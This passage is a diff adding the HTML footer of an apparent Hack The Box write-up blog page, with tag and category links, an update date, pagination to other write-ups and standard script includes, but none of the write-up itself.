+      <a href="/tags/#php" class="page__taxonomy-item" rel="tag">php</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">python</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#smb" class="page__taxonomy-item" rel="tag">smb</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#smbmap" class="page__taxonomy-item" rel="tag">smbmap</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#vhosts" class="page__taxonomy-item" rel="tag">vhosts</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-07-13T00:00:00+02:00">July 13, 2019</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-writeup-hackback/" class="pagination--pager" title="Hackback - Hack The Box
+">Previous</a>
+    
+    
+      <a href="/htb-writeup-ctf/" class="pagination--pager" title="CTF - Hack The Box
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2022 HackCommander</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
